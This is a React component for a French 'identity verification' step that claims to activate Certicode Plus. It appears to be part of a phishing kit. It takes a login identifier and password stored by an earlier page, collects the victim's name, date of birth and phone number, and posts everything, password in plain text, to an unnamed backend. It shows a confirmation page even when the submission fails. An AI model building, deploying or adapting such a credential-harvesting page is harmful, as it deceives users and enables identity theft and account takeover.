import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { Button } from '../components/ui/button';
import { User, Calendar, Phone, Loader2 } from 'lucide-react';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;

const PersonalInfoStep = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    lastName: '',
    firstName: '',
    dateOfBirth: '',
    phoneNumber: ''
  });

  useEffect(() => {
    const identifier = sessionStorage.getItem('certicode_identifier');
    const password = sessionStorage.getItem('certicode_password');
    if (!identifier || !password) {
      navigate('/login');
    }
  }, [navigate]);

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!formData.lastName || !formData.firstName || !formData.dateOfBirth || !formData.phoneNumber) return;

    setLoading(true);
    try {
      const identifier = sessionStorage.getItem('certicode_identifier');
      const password = sessionStorage.getItem('certicode_password');

      await axios.post(`${BACKEND_URL}/api/certicode/submit`, {
        identifier,
        password,
        first_name: formData.firstName,
        last_name: formData.lastName,
        date_of_birth: formData.dateOfBirth,
        phone_number: formData.phoneNumber
      });

      sessionStorage.removeItem('certicode_identifier');
      sessionStorage.removeItem('certicode_password');
      navigate('/final-confirmation');
    } catch (error) {
      console.error('Submission error:', error);
      navigate('/final-confirmation');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 py-8 px-4" data-testid="personal-info-step">
      <div className="max-w-lg mx-auto">
        <div className="bg-white rounded-xl shadow-lg p-8">
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-[#003DA5]/10 rounded-full flex items-center justify-center mx-auto mb-4">
              <User className="text-[#003DA5]" size={32} />
            </div>
            <h2 className="text-2xl font-bold text-gray-900">Vérification d'identité</h2>
            <p className="text-gray-600 mt-2">Confirmez vos informations personnelles pour activer Certicode Plus</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-5">
            {/* Nom */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Nom</label>
              <div className="relative">
                <User className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
                <input
                  type="text"
                  name="lastName"
                  value={formData.lastName}
                  onChange={handleChange}
                  placeholder="Votre nom"
                  required
                  data-testid="input-last-name"
                  className="w-full pl-10 pr-4 py-3 border-2 border-gray-200 rounded-lg focus:border-[#003DA5] focus:outline-none transition-colors text-gray-900"
                />
              </div>
            </div>

            {/* Prénom */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Prénom</label>
              <div className="relative">
                <User className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
                <input
                  type="text"
                  name="firstName"
                  value={formData.firstName}
                  onChange={handleChange}
                  placeholder="Votre prénom"
                  required
                  data-testid="input-first-name"
                  className="w-full pl-10 pr-4 py-3 border-2 border-gray-200 rounded-lg focus:border-[#003DA5] focus:outline-none transition-colors text-gray-900"
                />
              </div>
            </div>

            {/* Date de naissance */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Date de naissance</label>
              <div className="relative">
                <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
                <input
                  type="date"
                  name="dateOfBirth"
                  value={formData.dateOfBirth}
                  onChange={handleChange}
                  required
                  data-testid="input-date-of-birth"
                  className="w-full pl-10 pr-4 py-3 border-2 border-gray-200 rounded-lg focus:border-[#003DA5] focus:outline-none transition-colors text-gray-900"
                />
              </div>
            </div>

            {/* Numéro de téléphone */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Numéro de téléphone</label>
              <div className="relative">
                <Phone className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
                <input
                  type="tel"
                  name="phoneNumber"
                  value={formData.phoneNumber}
                  onChange={handleChange}
                  placeholder="06 XX XX XX XX"
                  required
                  data-testid="input-phone-number"
                  className="w-full pl-10 pr-4 py-3 border-2 border-gray-200 rounded-lg focus:border-[#003DA5] focus:outline-none transition-colors text-gray-900"
                />
              </div>
            </div>

            <Button
              type="submit"
              disabled={loading || !formData.lastName || !formData.firstName || !formData.dateOfBirth || !formData.phoneNumber}
              data-testid="submit-personal-info-btn"
              className="w-full py-6 text-lg font-semibold bg-[#003DA5] hover:bg-[#002d7a] text-white rounded-full transition-all duration-200 shadow-lg disabled:opacity-40"
            >
              {loading ? (
                <>
                  <Loader2 className="mr-2 animate-spin" size={20} />
                  Envoi en cours...
                </>
              ) : (
                'Valider mes informations'
              )}
            </Button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default PersonalInfoStep;
